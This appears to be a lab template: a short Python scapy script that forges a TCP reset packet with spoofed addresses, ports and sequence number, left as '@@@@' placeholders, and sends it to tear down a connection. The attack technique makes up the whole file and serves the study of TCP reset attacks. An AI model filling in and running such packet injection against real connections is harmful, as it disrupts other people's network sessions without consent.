#!/usr/bin/python
from scapy.all import *

print("SENDING RESET PACKET.........")
ip  = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@,flags="R",seq=@@@@)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
